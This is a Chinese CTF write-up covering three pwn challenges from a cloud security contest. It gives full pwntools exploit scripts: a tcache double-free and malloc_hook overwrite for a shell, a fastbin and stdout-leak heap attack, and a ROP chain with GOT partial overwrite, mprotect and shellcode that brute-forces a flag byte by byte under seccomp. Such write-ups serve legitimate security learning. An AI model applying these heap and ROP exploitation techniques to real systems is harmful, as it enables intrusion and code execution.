---
title: 云安全CTF
categories:
- 云安全CTF
---
# 数字经济云安全共测大赛初赛

## 前言

是第一场正经打的线上赛，上午做了俩题就去线下了（线下被暴打，不过那是另一个故事了）。前两题比较基础，第一题甚至混了二血，第三题是seccomp的题目，最近第二次见了，感觉很综合，今天花了一天做了出来（在17的提示下orz）。

## amazon

### 漏洞利用

libc 2.27，check的时候double free，Show有UAF，Free(0x80)*8泄露libc，分配的时候先把这个unsorted bin分成chunk1和chunk2，再分配0x80的时候走tcache拿到和之前Unsorted bin一样的块，再从0x20处写实际上可以写chunk2的fd，修改到malloc_hook-0x28，从而可以写realloc_hook和malloc_hook，调整偏移即可get shell

### exp.py

```py
#coding=utf-8
from pwn import *
from time import sleep
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./amazon')
libc_offset = 0x3c4b20
gadgets = [0x4f2c5,0x4f322,0x10a38c]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./amazon')

else:
    libc = ELF('./libc-2.27.so')
    p = remote('121.41.38.38',9999)

def Alloc(item_choice,num,size,content):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil("What item do you want to buy: ")
    p.sendline(str(item_choice))
    p.recvuntil("How many: ")
    p.sendline(str(num))
    p.recvuntil("How long is your note: ")
    p.sendline(str(size))
    if size > 0:
        p.recvuntil(": ")
        #sleep(0.2)
        p.send(content)

def Show():
    p.recvuntil('choice: ')
    p.sendline('2')

def Free(idx):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil("Which item are you going to pay for: ")
    p.sendline(str(idx))

def exp():
    #leak libc
    Alloc(1,1,0x80,'0')#0
    Alloc(1,1,0x80,'1')#1
    for i in range(8):
        Free(0)
    Show()
    p.recvuntil("Name: ")
    libc_base = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - 96 - 0x3ebc40
    log.success('libc base => ' + hex(libc_base))
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    #system_addr = libc_base + libc.sym['system']
    realloc_addr = libc_base + libc.sym['realloc']

    #get shell
    Alloc(1,1,0,'0')#2
    Alloc(1,1,0x50,'0')#3
    #
    Free(3)
    payload= p64(0)+p64(0x81)+p64(malloc_hook-0x28)
    Alloc(1,1,0x80,payload)#4
    #
    Alloc(1,1,0x50,"/bin/sh\x00")#5
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil("What item do you want to buy: ")
    p.sendline(str(1))
    p.recvuntil("How many: ")
    p.sendline(str(2))
    p.recvuntil("How long is your note: ")
    p.sendline(str(80))
    #print p.recv(128)
    p.recvuntil("Content: ")
    shell_addr = libc_base + gadgets[1]
    p.send(p64(shell_addr)+p64(realloc_addr+0x4))
    #Alloc(1,1,0x50,p64(system_addr))#6
    #gdb.attach(p)
    Alloc(1,1,0,'0')
    #Free(5)

    p.interactive()

exp()
```

## fkroman

### 漏洞利用

没有泄露的常规题，libc 2.23，这个题又有double free又有堆溢出。。有点可利用地方太多手忙脚乱的感觉，最后磨磨蹭蹭跑出来了算是。

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./fkroman')
else:
    libc = ELF('./libc-2.23.so')
    p = remote('121.40.246.48',9999)
elf = ELF('./fkroman')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
def Alloc(idx,size):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(size))

def Free(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(index))

def Edit(idx,size,content):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(content)

def exp():
    #leak libc
    Alloc(0,0x98-4)#0
    Alloc(1,0x68-4)#1
    Alloc(2,0x88-4)#2
    Alloc(3,0x88-4)#3
    Free(0)
    Free(1)
    Edit(1,0x70,'a'*0x60+p64(0x110)+p64(0x90))
    Free(2)
    #



    Alloc(4,0x98-4)#4
    #gdb.attach(p)
    Edit(4,0xa2,'a'*0x90+p64(0)+p64(0xf1)+'\xdd\x25')


    #p.recvuntil('choice: ')
    #p.sendline('1')
    #p.recvuntil("Index: ")
    #p.sendline(str(5))
    #p.recvuntil("Invalid option!\n")

    #p.recvuntil("Size: ")
    #p.sendline(str(0x54))
    Alloc(5,0x34)
    Alloc(6,0xa0)#6
    Edit(6,0x30,'a'*0x20+p64(0)+p64(0x71))
    Edit(4,0xa0,'a'*0x90+p64(0)+p64(0x71))


    Alloc(7,0x60)#
    Alloc(8,0x64)#8
    #leak


    Edit(8,0x54,"\x00"*0x33+p64(0xfbad1800)+p64(0)*3+'\x00')
    p.recvuntil("\x00\x18\xad\xfb")
    p.recvn(0x1c)
    libc_base = u64(p.recv(8)) - (0x7ffff7dd2600-0x7ffff7a0d000)
    log.success("libc base => " + hex(libc_base))
    #get shell
    fake_chunk = libc_base + libc.sym['__malloc_hook']-0x23
    Alloc(9,0x68-4)#9
    Free(9)
    Edit(9,8,p64(fake_chunk))
    Alloc(10,0x60)#10
    Alloc(11,0x60)#10
    shell_addr = libc_base + gadgets[1]
    realloc = libc_base + libc.sym['realloc']
    Edit(11,27,'\x00'*0x13+p64(shell_addr))

    Alloc(1,0x17)

while True:
    try:
        exp()
        p.interactive()
        p.close()
    except Exception as e:
        p.close()
    if not debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./fkroman')

    else:
        libc = ELF('./libc-2.23.so')
        p = remote('121.40.246.48',9999)
```

## dark

### 程序逻辑

开始有个seccomp限制系统调用，程序保护没怎么开，main函数里有一处极大的栈溢出。

```c
__int64 Init()
{
  __int64 v0; // ST08_8

  alarm(0x10u);
  v0 = seccomp_init(0LL);
  seccomp_rule_add(v0, 0x7FFF0000LL, 0LL, 0LL);
  seccomp_rule_add(v0, 0x7FFF0000LL, 2LL, 0LL);
  seccomp_rule_add(v0, 0x7FFF0000LL, 10LL, 0LL);
  return seccomp_load(v0);
}
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf; // [rsp+0h] [rbp-10h]

  Init();
  read(0, &buf, 0x1000uLL);
  return 0LL;
}
```
```data
[*] '/home/ctf/Desktop/CTF/gongce/dark1/dark'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
seccomp-tools看下具体限制，只能执行open、read和mprotect系统调用
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0008
 0007: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```

### 漏洞利用

这道题前半部分是0CTF的Black hole，程序里查gadgets查不到，但是got表可写，alarm+0x5的地方是syscall，csu把其低字节写改成syscall我们就有syscall用了，用read的返回值修改rax=0xa，调用syscall修改bss为rwxp，由于系统禁了write，我们栈迁移之后只能open和read，无法显示flag，请教17学长之后得知新的方法，单字节cmp爆破，根据结果jz到read，此时程序会阻塞等待输入，而其他情况下程序执行非法指令出错结束，以此我们可以一个字节一个字节地爆破flag，最终拿到完整flag。

### exp.py

代码写的有点差。。目前只能人工看阻塞情况，之后ctrl+c打印目标字节，再手动修改偏移得到下一字节。

```py
#coding=utf-8
from pwn import *
import string
import signal
import sys
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./dark')
else:
    libc = ELF('./libc-2.27.so')
    p = remote('121.41.41.111',9999)
#num_letter = "0123456789abcdefghijklmnopqrstuvwxyz"
bak = '{}_'+string.ascii_lowercase + string.digits
elf = ELF('./dark')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

pop_rdi_ret = 0x000000000040127b
pop_rsi_r15_ret = 0x0000000000401279
ret_addr = 0x0000000000401016

leave_ret = 0x4011ef
csu_end_addr = 0x401272
csu_start_addr = 0x401258

def csu(rbx,rbp,r12,r13,r14,r15,fake_ebp,last):
    #r13d=edi
    #r14=rsi
    #r15=rdx
    #rbx = 0
    #r12 = call_func
    payload = p64(csu_end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    payload += p64(csu_start_addr)
    payload += 'a'*0x10
    payload += p64(fake_ebp)
    payload += 'a'*0x20
    payload += p64(last)
    print len(payload)
    return payload
    #0x80

def exp(char,dis):
    read_plt = elf.plt['read']
    read_got = elf.got['read']
    alarm_got = elf.got['alarm']
    bss_addr = 0x00404050
    payload = 'a'*0x10+p64(bss_addr)
    payload += p64(pop_rdi_ret)+p64(0)
    payload += p64(pop_rsi_r15_ret)+p64(bss_addr)+p64(0)
    payload += p64(read_plt)+p64(leave_ret)
    print payload
    #gdb.attach(p,'b* 0x40127c')
    p.send(payload)
    #
    payload = p64(bss_addr+0x88)+csu(0,1,read_got,0,alarm_got,0x1,bss_addr+0x88,leave_ret)
    #mprotect(0x404000,0x1000,7)
    #set rax
    payload += p64(bss_addr+0x88+0x88)+csu(0,1,read_got,0,bss_addr+0x400,0xa,bss_addr+0x88*2,leave_ret)
    #syscall
    payload += p64(bss_addr+0x88*3)+csu(0,1,alarm_got,bss_addr-0x50,0x1000,7,bss_addr+0x88*3,leave_ret)
    #open('')
    payload += p64(bss_addr+0x88*4)+p64(ret_addr)+p64(bss_addr+0x88*3+0x18)
    payload += asm(shellcraft.amd64.linux.open('./flag\x00'))
    payload += asm(shellcraft.amd64.linux.read(3,bss_addr+0x410,0x30))
    #buf=>0x404460
    flag_addr = 0x404460
    sc = asm('''
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    push 0x404560
    pop rsi
    push 0x100
    pop rdx
    push 0x404460
    pop rcx
    ''')
    #char = '1'
    sc += asm('mov rbx,[rcx+'+str(dis)+']')
    sc += asm('cmp bl,'+hex(ord(char)))
    sc += '\x74\x08'
    sc += 'a'*8
    sc += asm('mov rax,0;syscall')
    payload += sc
    '''
    write_sc = asm(shellcraft.amd64.linux.write(1,bss_addr+0x410-5,0x30))
    #payload += p64(0x01be5a306a5f016a)+p64(0x414561f681010101)+"\x01"
    #payload += asm("push 1;")
    #payload += asm("pop edi;")
    payload += asm("mov edi,1")
    #payload += asm("push 0x30")
    #payload += asm("pop edx")
    payload += asm("mov edx,0x30")
    payload += asm("mov esi,0x1010101")
    payload += asm("xor esi,0x1414564")
    payload += asm("push 0x40000001")
    payload += asm("pop rax")
    payload += asm("syscall")
    '''
    #payload += asm("push 0x40000001;pop rax;syscall")
    #write

    #
    sleep(0.1)
    #raw_input()
    #stack migratation
    p.send(payload)
    sleep(0.1)
    #raw_input()
    #partial overwrite
    p.send('\x45')
    #set rax=0xa
    sleep(0.1)
    #raw_input()
    p.sendline('a'*9)
    #payload += p64()
    #p.interactive()

count = 0
dis = 1
def my_exit(signum,frame):
    print str(dis+1)+" char is " + bak[count]
    sys.exit()
while True:
    signal.signal(signal.SIGINT,my_exit)
    total = len(bak)
    try:
        exp(bak[count],dis)
        #p.interactive()
        print "recv:"+p.recvline()
        print bak[count]
        p.close()
    except Exception as e:
        p.close()
        count += 1
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./dark')
    else:
        libc = ELF('./libc-2.27.so')
        p = remote('121.41.41.111',9999)
```
